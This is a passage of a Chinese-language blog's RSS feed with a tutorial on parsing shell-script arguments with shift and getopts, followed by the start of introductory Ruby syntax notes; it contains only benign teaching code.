<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>OhMyDarkSpace</title>
    <link>https://by-musi.github.io/</link>
    
    <image>
      <url>https://by-musi.github.io/icon.png</url>
      <title>OhMyDarkSpace</title>
      <link>https://by-musi.github.io/</link>
    </image>
    
    <atom:link href="https://by-musi.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>一个无聊的人，写点无聊的文</description>
    <pubDate>Mon, 01 Apr 2024 15:05:00 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>如何将命令行参数传递给 shell 脚本</title>
      <link>https://by-musi.github.io/2024/04/01/%E5%A6%82%E4%BD%95%E5%B0%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E7%BB%99_shell_%E8%84%9A%E6%9C%AC/</link>
      <guid>https://by-musi.github.io/2024/04/01/%E5%A6%82%E4%BD%95%E5%B0%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E7%BB%99_shell_%E8%84%9A%E6%9C%AC/</guid>
      <pubDate>Sun, 31 Mar 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>最近拖延症和畏难情绪泛滥得厉害，todo 加了一条又一条，忙不过来索性开摆了，哎。工作确实是有那么亿点小忙，工作思路也有点不明确，还得看论文；漏洞复现也是障碍重重，POC 针对的是 HTTP2 我搭建好的环境偏偏是 HTTP1.1，还得学习下 HTTP, HTTP2, HTTP1.1。</p><p>现实总是那么骨感。最开始我只想学习 Race Condition，后来研究案例学了下 WebRTC，又看了 ruby, mvc, rails，之后了解到 websocket 也存在条件竞争，就简单看了下 websocket。主要是我基础太差，碰到一个名词总是无法直接给出具体概念，不过我觉得这种学习方法也蛮好的，深度优先，逐渐丰富自己的技术栈；但也有其缺点，容易跑偏，学着学着就不知道学哪去了，不及时总结的话甚至不知道自己学了点啥。</p><p>怎么办，我开始迷茫了，呜呜呜 T_T</p><p>牢骚到此为止，写完这篇文章起码能划掉一条 todo 了。</p><p>hacking for fun</p><hr><p>工作中有遇到处理大量 url 的情况，就寻思着写个 shell 脚本，。相较于 Python，Shell 脚本有其天然优势，脚本中的每行代码都相当于是在命令行中执行，这也就允许我们方便地使用大量现有工具，简化实现，快速完成任务。此外，为了增加代码的灵活性，使用位置参数无疑首选方法，你也不想每次该参数都直接修改脚本吧！？But, shell 脚本的位置参数具体如何使用呢？希望这篇文章可以回答你的疑问。</p><p>先放几个符号：</p><table><thead><tr><th>Parameter(s)</th><th>Description</th></tr></thead><tbody><tr><td><code>$0</code></td><td>第一个位置参数</td></tr><tr><td><code>$1 … $9</code></td><td>the argument list elements from 1 to 9</td></tr><tr><td><code>$&#123;10&#125; … $&#123;N&#125;</code></td><td>the argument list elements beyond 9 (note the <a href="https://web.archive.org/web/20200408201336/https://wiki.bash-hackers.org/syntax/pe" title="syntax:pe">parameter expansion</a> syntax!)</td></tr><tr><td><code>$*</code></td><td>指代除了 <code>$0</code> 之外的所有参数</td></tr><tr><td><code>$@</code></td><td>指代除了 <code>$0</code> 之外的所有参数</td></tr><tr><td><code>$#</code></td><td>指代除了 <code>$0</code> 之外的参数的数量</td></tr></tbody></table><h1 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h1><p>如果将 <code>$1</code> 及之后的参数序列看成一个栈的话，<code>shift</code> 相当于是将 <code>$1</code> 出栈，之前的 <code>$2</code> 就成了新的 <code>$1</code>，其他参数依次类推。如果仅使用 <code>shift</code> 的话，默认移一位，也可用 <code>shift &lt;n&gt;</code> 移动 n 个参数。</p><p>举个栗子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">numargs=<span class="variable">$#</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;all of the params: <span class="variable">$@</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;the number of params: <span class="variable">$#</span>&quot;</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span> ; i &lt;= numargs ; i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>运行结果如下，<code>$0</code> 是 shell 脚本的第一个参数，一般被设置为脚本的名字，剩下的参数从 <code>$1</code> 到 <code>$4</code> 依次排序。</p><p><a data-fancybox="gallery" data-src="/images/2024/04/01/Pasted_image_20240324235938.png" data-caption=""><img src="/images/2024/04/01/Pasted_image_20240324235938.png"></a></p><p><code>shift &lt;n&gt;</code> 可以移动 n 个参数，我们尝试一次移动两个。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">numargs=<span class="variable">$#</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span> ; i &lt;= numargs ; i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">shift</span> 2</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>报错了，不过也是意料之中。</p><p><a data-fancybox="gallery" data-src="/images/2024/04/01/Pasted_image_20240325001425.png" data-caption=""><img src="/images/2024/04/01/Pasted_image_20240325001425.png"></a></p><p>虽然我 <code>shift 2</code> 报错了，但退一万步讲，<code>shift 1</code> 最后一次迭代的 <code>$1</code> 是 “caishao!”，<code>echo</code> 之后再使用 <code>shift</code> 不会报错嘛？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">numargs=<span class="variable">$#</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span> ; i &lt;= numargs ; i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">shift</span> 1 </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>修改下代码，观察最后一次迭代后 <code>$1</code> 的值。</p><p><a data-fancybox="gallery" data-src="/images/2024/04/01/Pasted_image_20240330104828.png" data-caption=""><img src="/images/2024/04/01/Pasted_image_20240330104828.png"></a></p><p>最后一次迭代，先是输出了 “caishao!” 之后 <code>shift 1</code>，然后输出了一共空值。解释：**<code>$#</code> 的值非负，就不会报错**。最后 <code>shift</code> 之后， 可以把命令看成 <code>sh ./shift1.sh</code>，只是没传参数罢了，这几行代码也没说非得要个参数不是？没报错也就不难理解了。</p><p>再看一个比较复杂的栗子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;I hate you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="title">display_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;不会有人看不懂源码吧，不会吧，不会吧？！&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">      -c | --content)</span><br><span class="line">  content=<span class="string">&quot;<span class="variable">$2</span>&quot;</span>   </span><br><span class="line">  <span class="built_in">shift</span> 2</span><br><span class="line">  ;;</span><br><span class="line">      -h | --<span class="built_in">help</span>)</span><br><span class="line">  display_help  <span class="comment"># 调用函数 display_help</span></span><br><span class="line">  <span class="comment"># 脚本就跑到这了，不用 shift 了</span></span><br><span class="line">  <span class="built_in">exit</span> 0</span><br><span class="line">  ;;</span><br><span class="line">      -u | --user)</span><br><span class="line">  username=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="built_in">shift</span> 2</span><br><span class="line">  ;;</span><br><span class="line">      -v | --verbose)</span><br><span class="line">  verbose=<span class="string">&quot;verbose&quot;</span></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line">  ;;</span><br><span class="line">      --) <span class="comment"># End of all options</span></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line">  <span class="built_in">break</span></span><br><span class="line">          ;;</span><br><span class="line">      -*)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Error: Unknown option: <span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line">  ;;</span><br><span class="line">      *)  <span class="comment"># No more options</span></span><br><span class="line">  <span class="built_in">break</span></span><br><span class="line">  ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$content</span>, <span class="variable">$username</span>&quot;</span></span><br><span class="line"><span class="comment"># End of file</span></span><br></pre></td></tr></table></figure><p>经常配环境的小伙伴都知道，调用 bash 脚本（或者说其他命令行工具）的基础语法是 <code>COMMAND [options] &lt;params&gt;</code>。我们简单跑一下脚本。</p><p><a data-fancybox="gallery" data-src="/images/2024/04/01/Pasted_image_20240330115204.png" data-caption=""><img src="/images/2024/04/01/Pasted_image_20240330115204.png"></a></p><p><code>shift</code> 之殇：</p><p><code>shift</code> 处理位置参数可太死板了！事无巨细，全是用户自己处理。有一个参数的选项用 <code>shift 2</code>，没参数的选项用 <code>shift</code>，甚至没法解释组合使用的选项（如：<code>-fu &lt;USER&gt;</code>），也没有简单的方式指定那些选项是必需的，参数多了维护起来也费劲。</p><p>众所周知，Linux 以“优雅”著称，那么位置参数传递有无“优雅”的解决方案呢？ 下面有请 <code>getopts</code> ！！</p><h1 id="getopts"><a href="#getopts" class="headerlink" title="getopts"></a>getopts</h1><blockquote><p><code>getopts</code> is neither able to parse GNU-style long options (<code>--myoption</code>) nor XF86-style long options (<code>-myoption</code>)</p></blockquote><p><code>getopts</code> 是 shell 的内置命令，也是用来处理命令行参数的。只能解析一个字符的选项，无法解析长选项，如 <code>--myoption</code> 或 <code>-myoption</code>。</p><p>基础语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getopts OPTSTRING VARNAME [ARGS...]</span><br></pre></td></tr></table></figure><p>工作原理：每次从 <code>OPTSTRING</code> 中读一个选项，选项名称存储在 <code>VARNAME</code>，如果需要参数，再读取对应参数 <code>ARGS</code>，参数值存储在 <code>$OPTARG</code> 中。<code>$OPTARG</code> 总是存放下一个待处理的位置参数。简单来讲就是根据相应的语法规则，自动给你加了个 <code>shift [1\2]</code> 移位命令。</p><p>我们对上面 shift 部分的代码使用 getopts 进行修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;I hate you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usage</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;不会有人看不懂源码吧，不会吧，不会吧？！\n&quot;</span> </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;Usage: sh example2.sh -u caishao [-c] [&#x27;I love you&#x27;]\nOptions:\n  -u\t-\t a person you love\n  -c\t-\t sth you want to say\n  -h\t-\t show this help content\n&quot;</span> 1&gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;:c:hu:&quot;</span> opt; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">        c)</span><br><span class="line">    content=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span>   </span><br><span class="line">    ;;</span><br><span class="line">        h)</span><br><span class="line">    usage  </span><br><span class="line">    ;;</span><br><span class="line">        u)</span><br><span class="line">    username=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span></span><br><span class="line">    ;;</span><br><span class="line">    \?)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Invalid option: -<span class="variable">$OPTARG</span>&quot;</span> &gt;&amp;2</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">            ;;  </span><br><span class="line">        :)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Option -<span class="variable">$OPTARG</span> requires an argument.&quot;</span> &gt;&amp;2</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            usage</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">shift</span> $((OPTIND - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;username&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    usage; <span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$content</span>, <span class="variable">$username</span>&quot;</span></span><br><span class="line"><span class="comment"># End of file</span></span><br></pre></td></tr></table></figure><p>运行结果演示：</p><p><a data-fancybox="gallery" data-src="/images/2024/04/01/Pasted_image_20240330235321.png" data-caption=""><img src="/images/2024/04/01/Pasted_image_20240330235321.png"></a></p><p>因为 <code>getopts</code> 每次仅读取一个选项及其参数值，且在遇到第一个非选项的参数（不是以 ‘-‘ 开头的字符串）时，会返回 FALSE，这也使得我们可以使用 while 循环优雅地读取参数。</p><p><code>getopts &quot;:c:hu:&quot; opt;</code> 中的 <code>&quot;:c:hu:&quot;</code> 就是上文提到的 <code>OPTSTRING</code>。其中 <code>c:</code> 和 <code>u:</code> 表示选项 <code>-c</code> 和 <code>-u</code> 后会跟一个参数，其值存储在内置变量 <code>$OPTARG</code>。对 <code>OPTSTRING</code> 的解析方式也说明了 getopts 无法解析长选项。</p><p>getopts 不会影响原来的位置参数序列，也就是说 getopts 处理完位置参数后，<code>$1</code> 表示的还是 <code>-c</code> 或 <code>-u</code> （栗子，懂我意思吧）。如果要读取之后的参数，可以使用上文中提到的 <code>shift</code>，但首先需要将 getopts 处理过的参数出栈，<code>shift $((OPTIND-1))</code>。</p><p>回到 <code>&quot;:c:hu:&quot;</code>，其中第一个 <code>:</code> 表示 getopts 的错误汇报（errot-reporting）模式使用 silent 模式，忽略错误。</p><p>getopts 的错误汇报（errot-reporting）模式：</p><ul><li>详尽模式（verbose mode）：事无巨细，啥都报</li><li>静默模式（silent mode）：忽略错误，以 <code>?</code> 和 <code>:</code> 后的内容汇报</li></ul><p><code>echo &quot;Invalid option: -$OPTARG&quot; &gt;&amp;2</code> 中的 <code>&gt;&amp;2</code> 表示将内容输出到 <code>stderr</code>，这里的 2 是特殊的 [[文件描述符(fd)]] 。</p><p>所谓文件描述符(File descriptor)，是一个非负整数，本质是一个索引值。当打开一个文件时，内核向进程返回一个文件描述符（open系统调用返回得到），后续read、write这个文件时，只需要用这个文件描述符来标识这个文件，将其作为参数传入read、write。0,1,2 这三个文件描述符值已经被赋予特殊含义，分别是标准输入(STDIN_FILENO),标准输出(STDOUT_FILENO)，标准错误(STDERR_FILENO)。</p><p>linux 中如果你不想显示结果的话，可以使用 <code>2&gt; /dev/null</code> 将错误重定向到一个空设备中。脚本中的 <code>&gt;&amp;2</code> 指明输出的是 <code>stderr</code> 才能跟 <code>2&gt; /dev/null</code> 无缝衔接，不然 shell 咋知道输出的是报错呢。</p><p><a data-fancybox="gallery" data-src="/images/2024/04/01/Pasted_image_20240331222952.png" data-caption=""><img src="/images/2024/04/01/Pasted_image_20240331222952.png"></a></p><p>剩下还有没搞懂的自己谷歌下吧，这次写的废话有那么亿点点多了。</p><p>参考资料：</p><ol><li><a href="https://web.archive.org/web/20200507131743/https:/wiki.bash-hackers.org/howto/getopts_tutorial">Small getopts tutorial</a></li><li><a href="https://web.archive.org/web/20200408201336/https://wiki.bash-hackers.org/scripting/posparams">Handling positional parameters</a></li><li><a href="https://en.wikipedia.org/wiki/Getopts">Wikipedia Getopts</a></li></ol>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/linux/">linux</category>
      
      
      <comments>https://by-musi.github.io/2024/04/01/%E5%A6%82%E4%BD%95%E5%B0%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E7%BB%99_shell_%E8%84%9A%E6%9C%AC/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>简单过一下Ruby基础语法</title>
      <link>https://by-musi.github.io/2024/02/28/%E7%AE%80%E5%8D%95%E8%BF%87%E4%B8%80%E4%B8%8BRuby%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</link>
      <guid>https://by-musi.github.io/2024/02/28/%E7%AE%80%E5%8D%95%E8%BF%87%E4%B8%80%E4%B8%8BRuby%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</guid>
      <pubDate>Tue, 27 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>学 web 安全也有段时间了，但我一直都只是在打靶场，实战直接猿形毕露，连个后台都找不到，呜呜。所以，我打算稍微改变下学习方式，目前思路是酱紫的：针对某一课题（最近在看 race conditions）–&gt; 尽可能多、尽可能详细地分析实战案例、CVE –&gt; 挑一些典型的尝试复现 –&gt; 看到新的 vector 及时实践 –&gt; 抽象出通用规律，探索自动化的可能。</p><p>不知道这思路好不好使，不过，干就完了！！</p><p>在分析过程中碰到好多 Ruby 代码，就简单过了下 Ruby 的基础语法，本文更多的是我学习过程中的记录，方便后续查阅。根据老马的第一性原理，我在学了 Ruby 基础语法之后，rails 应该也没啥问题了，devise 也是手到擒来，漏洞赏金绝对能拿到手软，如果没有，那就是老马有问题！ <del>（不是）</del></p><p>话不多说，hacking for fun!</p><p><strong>啥时候能挖到我的处女洞啊！！！</strong></p><p>参考资料：</p><ul><li><a href="https://ithelp.ithome.com.tw/users/20150977/ironman/5049?page=1">一探紅寶石的神秘面紗 - Ruby 及 Rails入門介紹 系列</a></li><li><a href="https://www.ruby-lang.org/en/documentation/quickstart/">Ruby in Twenty Minutes</a></li></ul><h1 id="输出字符串"><a href="#输出字符串" class="headerlink" title="输出字符串"></a>输出字符串</h1><p>括号可加可不加。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 印出 Hello, World </span></span><br><span class="line">print <span class="string">&quot;Hello, World&quot;</span></span><br><span class="line"><span class="comment"># 印出 Hello, World 字樣，换行</span></span><br><span class="line">puts <span class="string">&quot;Hello, World&quot;</span></span><br><span class="line"><span class="comment"># 印出 &quot;Hello, World&quot; 字樣（含引号），换行</span></span><br><span class="line">p <span class="string">&quot;Hello, World&quot;</span></span><br><span class="line"></span><br><span class="line">p <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">p %Q (hello world) <span class="comment"># 印出 &quot;hello world&quot;，双引号</span></span><br><span class="line">p %q (hello world) <span class="comment"># 印出 &#x27;hello world&#x27;，单引号</span></span><br></pre></td></tr></table></figure><p>字符串中嵌入变量：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Sean&quot;</span></span><br><span class="line">age = <span class="number">18</span></span><br><span class="line">puts <span class="string">&quot;I&#x27;m <span class="subst">#&#123;name&#125;</span>, and I am <span class="subst">#&#123;age&#125;</span> years old&quot;</span> <span class="comment"># I&#x27;m Sean, and I am 18 years old</span></span><br><span class="line"></span><br><span class="line">puts <span class="string">%Q(I&#x27;m <span class="subst">#&#123;name&#125;</span>, and I am <span class="subst">#&#123;age&#125;</span> years old)</span> <span class="comment"># I&#x27;m Sean, and I am 18 years old</span></span><br><span class="line">puts <span class="string">%q(I&#x27;m <span class="subst">#&#123;name&#125;</span>, and I am <span class="subst">#&#123;age&#125;</span> years old)</span> <span class="comment"># 同單引號會失效</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">say_hi = <span class="string">&quot;hello world&quot;</span></span><br><span class="line">puts say_hi[<span class="number">0</span>] <span class="comment"># =&gt; 印出 h</span></span><br><span class="line">puts say_hi[<span class="number">5</span>] <span class="comment"># =&gt; 印出 空白 (注意空格也是字元)</span></span><br><span class="line"></span><br><span class="line">say_hi[<span class="number">0</span>..<span class="number">5</span>] = <span class="string">&quot;Hi!&quot;</span> <span class="comment">#(把第0位到第5位字元重新指定，中間的..是範圍的用法)</span></span><br><span class="line">puts say_hi    <span class="comment"># =&gt; Hi! World</span></span><br></pre></td></tr></table></figure><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 這邊被單行註解瞜!!!</span></span><br><span class="line"><span class="comment"># 這邊被單行註解瞜!!!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">=begin</span></span><br><span class="line"><span class="comment">這邊是多⾏註解啦!!</span></span><br><span class="line"><span class="comment">這邊是多⾏註解啦!!</span></span><br><span class="line"><span class="comment"> 等等。</span></span><br><span class="line"><span class="comment">=end</span></span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>有时候 <code>()</code> 可加可不加</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span> <span class="comment"># def hello()</span></span><br><span class="line">puts <span class="string">&quot;hi, 你好啊!&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><code>?</code> 和 <code>!</code> 可作为函数命名的一部分，不过只能放在最后面</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">double_num?</span>(<span class="params">num</span>)</span><br><span class="line"> <span class="keyword">return</span> num * <span class="number">2</span> <span class="comment"># 回傳 num*2 ，可以省略return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">p double_num?(<span class="number">5</span>) <span class="comment"># 印出 10</span></span><br></pre></td></tr></table></figure><p>方法后的 <code>!</code> 会改变对象原本的值。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line">p list.sort <span class="comment"># 排序但不改變原本陣列，印出[1,2,3,4]</span></span><br><span class="line">p list <span class="comment"># 原本陣列還是印 [1,4,3,2]</span></span><br><span class="line">p list.sort! <span class="comment"># 排序但改變原本陣列 [1,2,3,4]</span></span><br><span class="line">p list <span class="comment"># 原本陣列改成 [1,2,3,4]</span></span><br></pre></td></tr></table></figure><h1 id="列表-数组-array"><a href="#列表-数组-array" class="headerlink" title="列表&#x2F;数组 array"></a>列表&#x2F;数组 array</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="string">&quot;apple&quot;</span>,<span class="string">&quot;bird&quot;</span>,<span class="string">&quot;哈樓&quot;</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">list = <span class="string">%w(apple bird 哈樓 1 2)</span> <span class="comment"># [&quot;apple&quot;,&quot;bird&quot;,&quot;哈樓&quot;, &quot;1&quot;, &quot;2&quot;] =&gt; 此时 &quot;1&quot;,&quot;2&quot; 是字符串</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pokemon = [<span class="string">&quot;皮卡丘&quot;</span>,<span class="string">&quot;傑尼龜&quot;</span>,<span class="string">&quot;妙蛙種子&quot;</span>,<span class="string">&quot;小火龍&quot;</span>]</span><br><span class="line">puts pokemon[<span class="number">0</span>] <span class="comment"># 印出 皮卡丘</span></span><br><span class="line">puts pokemon[<span class="number">1</span>] <span class="comment"># 印出 傑尼龜</span></span><br><span class="line">puts pokemon[-<span class="number">1</span>] <span class="comment"># 印出 小火龍</span></span><br><span class="line">puts pokemon[-<span class="number">2</span>] <span class="comment"># 印出 妙蛙種子</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以用 first 和 last 取出頭或尾，</span></span><br><span class="line">puts pokemon.first <span class="comment"># 印出 皮卡丘</span></span><br><span class="line">puts pokemon.last <span class="comment"># 印出 小火龍</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># length表示陣列的長度</span></span><br><span class="line">puts pokemon.length <span class="comment"># 印出 4</span></span><br><span class="line">pokemon &lt;&lt; <span class="string">&#x27;小智&#x27;</span> <span class="comment"># 